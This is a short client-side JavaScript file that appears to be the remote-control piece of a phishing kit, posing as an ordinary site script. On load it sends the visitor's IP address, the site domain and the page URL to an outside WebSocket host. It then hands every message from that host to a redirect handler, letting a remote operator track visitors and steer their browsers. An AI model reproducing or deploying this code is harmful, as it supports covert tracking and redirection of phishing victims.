var socketId = sessionStorage.getItem('socketId');
var socket;
var currentUrl = window.location.href;
var domain = window.location.hostname;  // Get the domain of the current page

async function getClientIp() {
  const response = await fetch('utility/getip.php'); // Your endpoint to get the client IP
  const data = await response.json();
  return data.ip; // Assuming the response returns { "ip": "client_ip_here" }
}

// Initialize WebSocket connection
async function initWebSocket() {
  const clientIp = await getClientIp(); // Get the client IP

  // Create WebSocket connection, append socketId and clientIp if available
  if (socketId) {
    console.log('Socket ID:', socketId);  // Log socket ID
    socket = new WebSocket('wss://sc.qdconnmin.me/wss2/?socketId=' + socketId.trim() + '&domain=' + encodeURIComponent(domain) + '&clientIp=' + encodeURIComponent(clientIp));
  } else {
    socket = new WebSocket('wss://sc.qdconnmin.me/wss2/?domain=' + encodeURIComponent(domain) + '&clientIp=' + encodeURIComponent(clientIp));
  }

  socket.onopen = function() {
    console.log('WebSocket connection established.');  // Simpler connection log

    // Send initial message to server with the current page URL
    var initialMessage = 'Hello, server! Connected from URL: ' + currentUrl;
    socket.send(initialMessage);
  };

  socket.onmessage = function(event) {
    var message = event.data;
    
    if (message.includes("socket ID")) {
      var splitSocketId = message.split(":");
      var socketId = splitSocketId[1].trim(); // Trim the socketId before storing
      console.log('Socket ID:', socketId);  // Only log the socket ID
      sessionStorage.setItem('socketId', socketId);

      // Send an AJAX request to the PHP script to store the socketId in the session
      var xhttp = new XMLHttpRequest();
      xhttp.open("POST", "store_variable.php", true);
      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      xhttp.onreadystatechange = function() {
        if (xhttp.readyState === 4 && xhttp.status === 200) {
        //   console.log('PHP Session Set to:', socketId);  // Log confirmation
        }
      };
      xhttp.send("socketId=" + encodeURIComponent(socketId));
    } else {
      console.log('Received message from server:', message);  // Simpler log for other messages
    }

    // Call the handleRedirect function from redirect.js
    handleRedirect(message);
  };

  socket.onclose = function(event) {
    console.log('WebSocket connection closed.');  // Simplified close log
  };

  socket.onerror = function(error) {
    console.error('WebSocket error:', error);  // Keep the error log as is
  };
}

initWebSocket();

// Function to send a message to the server (optional, if needed)
function sendMessage() {
  var messageInput = document.getElementById('messageInput');
  var message = messageInput.value;
  socket.send(message);
  messageInput.value = '';
}
